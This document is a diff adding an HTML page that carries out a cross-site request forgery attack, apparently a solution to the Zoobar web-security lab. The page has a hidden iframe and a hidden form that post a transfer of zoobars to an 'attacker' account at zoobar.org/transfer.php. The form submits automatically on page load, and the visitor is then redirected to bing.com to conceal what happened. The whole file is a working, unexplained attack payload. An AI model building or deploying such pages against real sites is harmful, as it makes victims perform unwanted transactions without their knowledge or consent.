@@ -1,0 +1,21 @@
+<html>
+    <head></head>
+    <body>
+        <iframe id="attack_frame" name="attack_frame" style="visibility: hidden;"></iframe>
+        <form id="attack_form" action="http://zoobar.org/transfer.php" method="post" target="attack_frame" style="visibility: hidden;">
+            <input name="recipient" value="attacker" type="hidden"/>
+            <input name="zoobars" value="10" type="hidden"/>
+            <input id="send" value="Send" type="submit" name="submission" style="visibility: hidden;"/>
+        </form>
+        <script>
+            addEventListener("load", function() {
+                var attackFrame = document.getElementById("attack_frame");
+                attackFrame.addEventListener("load", function() {
+                    document.location="http://www.bing.com";
+                });
+                var sendButton = document.getElementById("send");
+                sendButton.click();
+            });
+        </script>
+    </body>
+</html>
